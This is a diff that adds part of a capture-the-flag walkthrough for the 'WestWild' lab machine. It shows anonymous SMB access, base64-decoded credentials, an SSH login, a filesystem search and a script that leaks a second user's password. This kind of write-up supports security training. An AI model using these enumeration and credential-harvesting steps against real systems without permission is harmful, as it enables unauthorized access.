@@ -84,12 +84,73 @@ we can see the `wave` share is accessible, let's connect to it:
 
 ```bash
 root@kali: smbclient --no-pass //192.168.127.250/wave
+
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Tue Jul 30 01:18:56 2019
+  ..                                  D        0  Thu Aug  1 19:02:20 2019
+  FLAG1.txt                           N       93  Mon Jul 29 22:31:05 2019
+  message_from_aveng.txt              N      115  Tue Jul 30 01:21:48 2019
 ```
 
+now download these to files and check the content :
 
+```text
+root@kali: cat FLAG1.txt 
+RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K
 
+root@kali: cat message_from_aveng.txt 
+Dear Wave ,
+Am Sorry but i was lost my password ,
+and i believe that you can reset  it for me . 
+Thank You 
+Aveng 
+```
 
+decode base64 message :
 
+```bash
+root@kali: echo -n 'RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K' | base64 -d
 
+Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
+user:wavex
+password:door+open
+```
 
+## 3.Gaining Shell
+
+Now we can ssh to system with the credentials : `wavex:door+open` :
+
+```bash
+wavex@WestWild:~$ id
+uid=1001(wavex) gid=1001(wavex) groups=1001(wavex)
+
+wavex@WestWild:~$ find / -group wavex 2>/dev/null | grep -v proc
+
+/sys/fs/cgroup/systemd/user/1001.user/1.session
+/sys/fs/cgroup/systemd/user/1001.user/1.session/tasks
+/usr/share/av/westsidesecret/ififoregt.sh
+/home/wavex
+/home/wavex/.cache
+/home/wavex/.cache/motd.legal-displayed
+/home/wavex/wave/FLAG1.txt
+/home/wavex/wave/message_from_aveng.txt
+/home/wavex/.profile
+/home/wavex/.bashrc
+/home/wavex/.viminfo
+/home/wavex/.bash_logout
+/run/user/1001
+```
+
+we can see that we have access to `ififoregt.sh`, now check the content :
+
+```bash
+wavex@WestWild:~$ cat /usr/share/av/westsidesecret/ififoregt.sh
+
+ #!/bin/bash 
+ figlet "if i foregt so this my way"
+ echo "user:aveng"
+ echo "password:kaizen+80"
+```
 
